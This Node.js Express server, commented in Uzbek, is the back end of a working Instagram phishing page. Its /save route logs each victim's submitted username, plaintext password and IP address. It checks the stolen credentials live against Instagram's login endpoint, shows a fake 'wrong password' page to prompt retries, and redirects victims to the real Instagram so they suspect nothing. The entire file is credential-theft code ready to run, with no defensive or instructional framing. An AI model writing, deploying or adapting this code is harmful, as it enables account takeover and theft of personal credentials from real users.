const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Urinishlarni saqlash (maximum 1000 ta IP)
const MAX_IPS = 1000;
let urinishlar = new Map();

// Eski datani tozalash har 5 daqiqada
setInterval(() => {
    const hozir = Date.now();
    for (let [ip, data] of urinishlar) {
        if (hozir - data.vaqt > 30 * 60 * 1000) { // 30 daqiqadan eski
            urinishlar.delete(ip);
        }
    }
    if (urinishlar.size > MAX_IPS) {
        // Eng eskisini olib tashlash
        let engEski = null;
        let engEskiVaqt = Infinity;
        for (let [ip, data] of urinishlar) {
            if (data.vaqt < engEskiVaqt) {
                engEski = ip;
                engEskiVaqt = data.vaqt;
            }
        }
        if (engEski) urinishlar.delete(engEski);
    }
}, 5 * 60 * 1000);

// Instagram tekshiruvi
async function instagramTekshir(username, password) {
    try {
        const response = await fetch("https://www.instagram.com/accounts/login/ajax/", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "x-ig-app-id": "936619743392459",
                "x-csrftoken": "missing",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
                queryParams: "{}",
                optIntoOneTap: "false"
            })
        });

        const data = await response.json();
        return data.authenticated === true; // true = to'g'ri parol
    } catch (e) {
        return false;
    }
}

app.post("/save", async (req, res) => {
    try {
        const { username, password } = req.body;
        const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
        const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

        console.log(`TEKSHIRUV → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

        // Urinishlarni hisoblash
        let userData = urinishlar.get(ip);
        if (!userData) {
            urinishlar.set(ip, { count: 1, vaqt: Date.now() });
        } else {
            userData.count++;
            userData.vaqt = Date.now();
            urinishlar.set(ip, userData);
        }

        const urinishCount = urinishlar.get(ip).count;

        // Agar 3 marta urinib ko'rgan bo'lsa
        if (urinishCount >= 3) {
            console.log(`3 MARTA → ${username} Instagramga yo'naltirildi`);
            urinishlar.delete(ip);
            return res.redirect("https://www.instagram.com");
        }

        const togri = await instagramTekshir(username, password);

        if (togri) {
            console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi`);
            urinishlar.delete(ip);
            res.redirect("https://www.instagram.com");
        } else {
            console.log(`XATO → ${username} paroli noto'g'ri (${urinishCount}/3 urinish)`);
            const qolgan = 3 - urinishCount;
            res.send(`
                <!DOCTYPE html>
                <html>
                <head><meta charset="utf-8"><title>Xato</title></head>
                <body style="font-family:sans-serif;background:#fafafa;text-align:center;padding-top:100px;">
                    <h2 style="color:#ed4956;">Login yoki parol noto'g'ri</h2>
                    <p>Urinish: ${urinishCount}/3 | Qolgan: ${qolgan} ta</p>
                    <p>Iltimos, qayta urinib ko'ring</p>
                    <script>setTimeout(() => location.href="/", 2500);</script>
                </body>
                </html>
            `);
        }
    } catch (error) {
        // Har qanday xatolik bo'lsa ham Instagramga yo'naltirish
        console.log("XATO YUZ BERDI:", error.message);
        res.redirect("https://www.instagram.com");
    }
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => {
    console.log("Instagram real tekshiruv ishlayapti");
    console.log("Server CRASH BO'LMAYDI - xotira chegarasi mavjud");
});
